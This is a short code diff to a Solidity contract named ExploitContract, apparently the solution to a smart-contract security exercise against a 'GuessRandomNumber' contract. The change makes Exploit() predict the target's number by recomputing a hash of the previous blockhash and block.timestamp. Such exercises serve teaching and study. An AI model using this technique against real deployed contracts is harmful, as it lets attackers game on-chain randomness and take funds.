@@ -37,8 +37,7 @@ contract ExploitContract {
     GuessRandomNumber public guessRandomNumber;
     uint8 public answer;
 
-    function Exploit() public returns (uint8) {
-        
-        return answer;
+    function Exploit() public returns (uint8) { 
+        return uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
     }
 }
